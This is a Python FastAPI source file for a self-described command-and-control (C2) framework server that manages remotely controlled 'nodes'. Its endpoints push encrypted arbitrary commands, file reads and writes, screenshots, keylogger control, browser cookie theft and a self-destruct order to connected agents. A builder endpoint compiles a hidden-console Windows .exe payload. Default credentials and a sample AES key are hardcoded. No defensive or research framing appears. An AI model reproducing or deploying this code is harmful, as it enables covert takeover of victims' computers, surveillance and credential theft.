from fastapi import FastAPI, APIRouter, WebSocket, WebSocketDisconnect, Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import json
import asyncio
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import hashlib
from jose import JWTError, jwt
import secrets

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Security Configuration
SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_urlsafe(32))
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60
AES_KEY = os.environ.get('AES_KEY', base64.b64encode(get_random_bytes(32)).decode())

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app
app = FastAPI(title="C2 Framework", version="1.0.0")
api_router = APIRouter(prefix="/api")

security = HTTPBearer()

# Connection Manager for WebSocket
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.node_info: Dict[str, Dict] = {}

    async def connect(self, node_id: str, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[node_id] = websocket
        logging.info(f"Node {node_id} connected")

    def disconnect(self, node_id: str):
        if node_id in self.active_connections:
            del self.active_connections[node_id]
        if node_id in self.node_info:
            self.node_info[node_id]['status'] = 'offline'
        logging.info(f"Node {node_id} disconnected")

    async def send_message(self, node_id: str, message: dict):
        if node_id in self.active_connections:
            try:
                encrypted = encrypt_message(json.dumps(message))
                await self.active_connections[node_id].send_text(encrypted)
                return True
            except Exception as e:
                logging.error(f"Error sending message to {node_id}: {e}")
                return False
        return False

    async def broadcast(self, message: dict, exclude: Optional[str] = None):
        for node_id in list(self.active_connections.keys()):
            if node_id != exclude:
                await self.send_message(node_id, message)

manager = ConnectionManager()

# Encryption Functions
def encrypt_message(plaintext: str) -> str:
    key = base64.b64decode(AES_KEY)
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return json.dumps({'iv': iv, 'ciphertext': ct})

def decrypt_message(encrypted: str) -> str:
    try:
        data = json.loads(encrypted)
        key = base64.b64decode(AES_KEY)
        iv = base64.b64decode(data['iv'])
        ct = base64.b64decode(data['ciphertext'])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        logging.error(f"Decryption error: {e}")
        return ""

# JWT Functions
def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise HTTPException(status_code=403, detail="Invalid authentication")
        return payload
    except JWTError:
        raise HTTPException(status_code=403, detail="Invalid authentication")

# Models
class LoginRequest(BaseModel):
    username: str
    password: str

class LoginResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"

class Node(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    hostname: str
    os: str
    ip: str
    status: str = "online"
    last_seen: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    token: str = Field(default_factory=lambda: secrets.token_urlsafe(32))

class NodeRegister(BaseModel):
    hostname: str
    os: str
    ip: str

class Command(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    node_id: str
    command: str
    result: Optional[str] = None
    status: str = "pending"  # pending, executed, failed
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class CommandCreate(BaseModel):
    node_id: str
    command: str

class CommandResult(BaseModel):
    command_id: str
    result: str
    status: str

class SystemInfo(BaseModel):
    node_id: str
    cpu_usage: float
    memory_usage: float
    disk_usage: float
    processes: int

class AuditLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    action: str
    user: Optional[str] = None
    node_id: Optional[str] = None
    details: Optional[str] = None
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class ScreenshotRequest(BaseModel):
    node_id: str

class FileListRequest(BaseModel):
    node_id: str
    path: Optional[str] = None

class FileReadRequest(BaseModel):
    node_id: str
    path: str

class FileWriteRequest(BaseModel):
    node_id: str
    path: str
    content: str  # base64

class KeyloggerAction(BaseModel):
    node_id: str
    action: str  # start, stop, get

class BuilderConfig(BaseModel):
    c2_server: str
    aes_key: str
    icon_path: Optional[str] = None
    hide_console: bool = True

# Authentication Endpoint
@api_router.post("/auth/login", response_model=LoginResponse)
async def login(request: LoginRequest):
    # Simple authentication - In production, use proper password hashing
    admin_user = os.environ.get('ADMIN_USER', 'admin')
    admin_pass = os.environ.get('ADMIN_PASS', 'c2admin123')
    
    if request.username == admin_user and request.password == admin_pass:
        access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
        access_token = create_access_token(
            data={"sub": request.username}, expires_delta=access_token_expires
        )
        
        # Log authentication
        log = AuditLog(action="login", user=request.username, details="Admin login successful")
        await db.audit_logs.insert_one(log.model_dump())
        
        return {"access_token": access_token, "token_type": "bearer"}
    
    raise HTTPException(status_code=401, detail="Invalid credentials")

# Node Management Endpoints
@api_router.post("/nodes/register", response_model=Node)
async def register_node(node_data: NodeRegister):
    node = Node(**node_data.model_dump())
    doc = node.model_dump()
    doc['last_seen'] = doc['last_seen'].isoformat()
    doc['created_at'] = doc['created_at'].isoformat()
    await db.nodes.insert_one(doc)
    
    # Log node registration
    log = AuditLog(action="node_register", node_id=node.id, details=f"Node registered: {node.hostname}")
    await db.audit_logs.insert_one(log.model_dump())
    
    return node

@api_router.get("/nodes", response_model=List[Node])
async def get_nodes(current_user: dict = Depends(verify_token)):
    nodes = await db.nodes.find({}, {"_id": 0}).to_list(1000)
    for node in nodes:
        if isinstance(node['last_seen'], str):
            node['last_seen'] = datetime.fromisoformat(node['last_seen'])
        if isinstance(node['created_at'], str):
            node['created_at'] = datetime.fromisoformat(node['created_at'])
        # Check if node is in active connections
        node['status'] = 'online' if node['id'] in manager.active_connections else 'offline'
    return nodes

@api_router.get("/nodes/{node_id}", response_model=Node)
async def get_node(node_id: str, current_user: dict = Depends(verify_token)):
    node = await db.nodes.find_one({"id": node_id}, {"_id": 0})
    if not node:
        raise HTTPException(status_code=404, detail="Node not found")
    if isinstance(node['last_seen'], str):
        node['last_seen'] = datetime.fromisoformat(node['last_seen'])
    if isinstance(node['created_at'], str):
        node['created_at'] = datetime.fromisoformat(node['created_at'])
    node['status'] = 'online' if node_id in manager.active_connections else 'offline'
    return node

@api_router.delete("/nodes/{node_id}")
async def delete_node(node_id: str, current_user: dict = Depends(verify_token)):
    # Send kill command before deleting
    if node_id in manager.active_connections:
        await manager.send_message(node_id, {"type": "kill", "command": "self_destruct"})
        await asyncio.sleep(1)
    
    result = await db.nodes.delete_one({"id": node_id})
    await db.commands.delete_many({"node_id": node_id})
    
    # Log node deletion
    log = AuditLog(action="node_delete", user=current_user['sub'], node_id=node_id, details="Node removed from system")
    await db.audit_logs.insert_one(log.model_dump())
    
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Node not found")
    return {"message": "Node deleted successfully"}

# Command Execution Endpoints
@api_router.post("/commands", response_model=Command)
async def create_command(cmd: CommandCreate, current_user: dict = Depends(verify_token)):
    command = Command(**cmd.model_dump())
    doc = command.model_dump()
    doc['timestamp'] = doc['timestamp'].isoformat()
    await db.commands.insert_one(doc)
    
    # Send command to node via WebSocket
    success = await manager.send_message(cmd.node_id, {
        "type": "command",
        "command_id": command.id,
        "command": cmd.command
    })
    
    if not success:
        command.status = "failed"
        await db.commands.update_one(
            {"id": command.id},
            {"$set": {"status": "failed", "result": "Node not connected"}}
        )
    
    # Log command execution
    log = AuditLog(
        action="command_execute",
        user=current_user['sub'],
        node_id=cmd.node_id,
        details=f"Command: {cmd.command}"
    )
    await db.audit_logs.insert_one(log.model_dump())
    
    return command

@api_router.get("/commands", response_model=List[Command])
async def get_commands(node_id: Optional[str] = None, current_user: dict = Depends(verify_token)):
    query = {"node_id": node_id} if node_id else {}
    commands = await db.commands.find(query, {"_id": 0}).sort("timestamp", -1).to_list(1000)
    for cmd in commands:
        if isinstance(cmd['timestamp'], str):
            cmd['timestamp'] = datetime.fromisoformat(cmd['timestamp'])
    return commands

@api_router.post("/commands/result")
async def submit_command_result(result: CommandResult):
    await db.commands.update_one(
        {"id": result.command_id},
        {"$set": {"result": result.result, "status": result.status}}
    )
    return {"message": "Result received"}

# System Info Endpoint
@api_router.post("/sysinfo")
async def receive_system_info(info: SystemInfo):
    await db.nodes.update_one(
        {"id": info.node_id},
        {"$set": {
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "cpu_usage": info.cpu_usage,
            "memory_usage": info.memory_usage,
            "disk_usage": info.disk_usage
        }}
    )
    return {"message": "Info received"}

# Audit Logs
@api_router.get("/logs", response_model=List[AuditLog])
async def get_audit_logs(limit: int = 100, current_user: dict = Depends(verify_token)):
    logs = await db.audit_logs.find({}, {"_id": 0}).sort("timestamp", -1).limit(limit).to_list(limit)
    for log in logs:
        if isinstance(log['timestamp'], str):
            log['timestamp'] = datetime.fromisoformat(log['timestamp'])
    return logs

# Statistics
@api_router.get("/stats")
async def get_statistics(current_user: dict = Depends(verify_token)):
    total_nodes = await db.nodes.count_documents({})
    online_nodes = len(manager.active_connections)
    total_commands = await db.commands.count_documents({})
    executed_commands = await db.commands.count_documents({"status": "executed"})
    
    return {
        "total_nodes": total_nodes,
        "online_nodes": online_nodes,
        "offline_nodes": total_nodes - online_nodes,
        "total_commands": total_commands,
        "executed_commands": executed_commands
    }

# Advanced Features Endpoints

# Screenshot
@api_router.post("/screenshot")
async def request_screenshot(req: ScreenshotRequest, current_user: dict = Depends(verify_token)):
    success = await manager.send_message(req.node_id, {"type": "screenshot"})
    if not success:
        raise HTTPException(status_code=404, detail="Node not connected")
    return {"message": "Screenshot requested"}

# File Browser
@api_router.post("/files/list")
async def list_files(req: FileListRequest, current_user: dict = Depends(verify_token)):
    success = await manager.send_message(req.node_id, {
        "type": "list_files",
        "path": req.path
    })
    if not success:
        raise HTTPException(status_code=404, detail="Node not connected")
    return {"message": "File list requested"}

@api_router.post("/files/read")
async def read_file(req: FileReadRequest, current_user: dict = Depends(verify_token)):
    success = await manager.send_message(req.node_id, {
        "type": "read_file",
        "path": req.path
    })
    if not success:
        raise HTTPException(status_code=404, detail="Node not connected")
    return {"message": "File read requested"}

@api_router.post("/files/write")
async def write_file(req: FileWriteRequest, current_user: dict = Depends(verify_token)):
    success = await manager.send_message(req.node_id, {
        "type": "write_file",
        "path": req.path,
        "content": req.content
    })
    if not success:
        raise HTTPException(status_code=404, detail="Node not connected")
    return {"message": "File write requested"}

# Keylogger
@api_router.post("/keylogger")
async def control_keylogger(req: KeyloggerAction, current_user: dict = Depends(verify_token)):
    if req.action == "start":
        msg_type = "start_keylogger"
    elif req.action == "stop":
        msg_type = "stop_keylogger"
    elif req.action == "get":
        msg_type = "get_keylog"
    else:
        raise HTTPException(status_code=400, detail="Invalid action")
    
    success = await manager.send_message(req.node_id, {"type": msg_type})
    if not success:
        raise HTTPException(status_code=404, detail="Node not connected")
    
    log = AuditLog(
        action=f"keylogger_{req.action}",
        user=current_user['sub'],
        node_id=req.node_id,
        details=f"Keylogger action: {req.action}"
    )
    await db.audit_logs.insert_one(log.model_dump())
    
    return {"message": f"Keylogger {req.action} requested"}

# Cookie Stealer
@api_router.post("/cookies/steal/{node_id}")
async def steal_cookies(node_id: str, current_user: dict = Depends(verify_token)):
    success = await manager.send_message(node_id, {"type": "steal_cookies"})
    if not success:
        raise HTTPException(status_code=404, detail="Node not connected")
    
    log = AuditLog(
        action="steal_cookies",
        user=current_user['sub'],
        node_id=node_id,
        details="Browser cookies extraction requested"
    )
    await db.audit_logs.insert_one(log.model_dump())
    
    return {"message": "Cookie extraction requested"}

# Builder
@api_router.post("/builder/generate")
async def generate_payload(config: BuilderConfig, current_user: dict = Depends(verify_token)):
    try:
        import subprocess
        import tempfile
        import shutil
        
        # Create temp directory
        temp_dir = tempfile.mkdtemp()
        agent_path = os.path.join(temp_dir, "agent_custom.py")
        
        # Read advanced agent template
        with open("/app/agent_advanced.py", "r") as f:
            agent_code = f.read()
        
        # Replace configuration
        agent_code = agent_code.replace(
            'C2_SERVER = "ws://localhost:8001/api/ws"',
            f'C2_SERVER = "{config.c2_server}"'
        )
        agent_code = agent_code.replace(
            'AES_KEY = "ba4gd0qnveoxHglI4OL8n0jRAteGLexoWN2FbOH2zsU="',
            f'AES_KEY = "{config.aes_key}"'
        )
        
        # Write customized agent
        with open(agent_path, "w") as f:
            f.write(agent_code)
        
        # Build with PyInstaller
        output_dir = "/app/payloads"
        os.makedirs(output_dir, exist_ok=True)
        
        payload_name = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
        
        build_cmd = [
            "pyinstaller",
            "--onefile",
            "--name", payload_name.replace(".exe", ""),
            "--distpath", output_dir,
            "--workpath", temp_dir,
            "--specpath", temp_dir
        ]
        
        if config.hide_console:
            build_cmd.append("--noconsole")
        
        build_cmd.append(agent_path)
        
        # Execute build
        result = subprocess.run(build_cmd, capture_output=True, text=True)
        
        # Cleanup
        shutil.rmtree(temp_dir)
        
        if result.returncode == 0:
            log = AuditLog(
                action="payload_generated",
                user=current_user['sub'],
                details=f"Payload generated: {payload_name}"
            )
            await db.audit_logs.insert_one(log.model_dump())
            
            return {
                "message": "Payload generated successfully",
                "filename": payload_name,
                "path": os.path.join(output_dir, payload_name)
            }
        else:
            return {
                "message": "Build failed",
                "error": result.stderr
            }
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# WebSocket Endpoint for Nodes
@app.websocket("/api/ws/{node_token}")
async def websocket_endpoint(websocket: WebSocket, node_token: str):
    # Verify node token
    node = await db.nodes.find_one({"token": node_token}, {"_id": 0})
    if not node:
        await websocket.close(code=4001)
        return
    
    node_id = node['id']
    await manager.connect(node_id, websocket)
    
    # Update node status
    await db.nodes.update_one(
        {"id": node_id},
        {"$set": {"status": "online", "last_seen": datetime.now(timezone.utc).isoformat()}}
    )
    
    try:
        while True:
            data = await websocket.receive_text()
            decrypted = decrypt_message(data)
            if decrypted:
                message = json.loads(decrypted)
                
                if message['type'] == 'heartbeat':
                    await db.nodes.update_one(
                        {"id": node_id},
                        {"$set": {"last_seen": datetime.now(timezone.utc).isoformat()}}
                    )
                    await manager.send_message(node_id, {"type": "ack"})
                
                elif message['type'] == 'command_result':
                    await db.commands.update_one(
                        {"id": message['command_id']},
                        {"$set": {
                            "result": message['result'],
                            "status": message['status']
                        }}
                    )
    
    except WebSocketDisconnect:
        manager.disconnect(node_id)
        await db.nodes.update_one(
            {"id": node_id},
            {"$set": {"status": "offline"}}
        )
    except Exception as e:
        logging.error(f"WebSocket error for node {node_id}: {e}")
        manager.disconnect(node_id)

# Health Check
@api_router.get("/")
async def root():
    return {"message": "C2 Framework API", "status": "operational"}

# Include router
app.include_router(api_router)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
